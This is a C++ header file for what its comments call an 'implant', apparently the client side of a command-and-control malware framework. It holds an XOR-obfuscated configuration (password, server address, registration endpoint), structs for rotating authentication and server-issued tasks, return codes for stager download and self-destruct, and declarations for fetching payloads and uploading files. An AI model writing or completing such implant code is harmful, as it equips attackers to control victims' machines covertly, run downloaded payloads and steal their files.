#pragma once
#include <cstring>
#include <string>
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>
#include "dynamicresolution.h"





// separated by 0xe9
typedef struct netconfig {
	std::vector<BYTE> config = {
		0x41, 0x52, 0x51, 0x46, 0x45, 0x5c, 0x5c, 0x57, 0xe9, //ivybells = initial password
		0x19, 0x16, 0x13, 0x1a, 0x18, 0x1a, 0x18, 0x1a, 0x19, 0xe9, // SERVER  -->  127.0.0.1
		0x1b, 0x57, 0x51, 0x5a, 0x47, 0x2, 0x5a, 0x45, 0x53, 0x75, 0x75, 0x61, 0x64, 0x6d, 0x55, \
		0x57, 0x45, 0x56, 0x15, 0x15, 0x17, 0x14, 0x45, 0x13, 0x10, 0x1d, 0x19, 0x18, 0xe9, // Registration Endpoint  -->  /sync&newUUID=user5534e78-10
	};
}NETCONFIG, * PNETCONFIG;


typedef struct authData {
	std::string pass; // this will be the dynamic password, if the wrong password is given to the server, the server will instruct the implant to self-destruct
	int modifer; // this will specify how the password will change over time --> will be passed into a function with a switch statement that takes this entire struct as a parameter
	bool registraton; // this flag will be set true when the implant first beacons to the server, it will receive an initial password
	std::string uuid; // this is the agents uuid retrieved during registration
}AUTHDATA, *PAUTHDATA;




typedef struct Task {
	int taskNumber; // this will be fed into a switch statement in the main loop to specify what kind of functionality to carry out
	std::string args; // arguments to the task
	std::string ReturnData; // store return data that will be sent back to the server here
	std::string taskId; // this uniquely identifies the task
}TASK, * PTASK;

typedef struct ReturnCodes {
	int okayRequest =			10; // OKAY request
	int noTasks =				20; // NO current tasks
	int badAuth =				30; // Authentication failure
	int stagerReady =			40; // Server has stager ready for download
	int stagerNotReady =		50; // This will return when implant requests a stager and it isn't ready
	int selfDestruct =			60; // implant will delete itself when this code is returned
	int dataReceived =			70; // Data was successfully received and stored in the database
	int registrationSuccess =	80; // Registration with the server was successful
	int registrationFailure =	90; // Registration with the server was unsuccessful
}RETCODES, * PRETCODES;




void registerAgent(PAPI api, PAUTHDATA authenticationData);
BYTE* retrievePayload(PAPI api, PAUTHDATA auth, std::string modUUID);
void getTask(PAUTHDATA authdata, std::string uri, PTASK t);
bool updateTask(PAUTHDATA authdata, Task task, std::string uri, std::string status);
bool uploadFile(std::string& result, std::string uri, std::string filePath);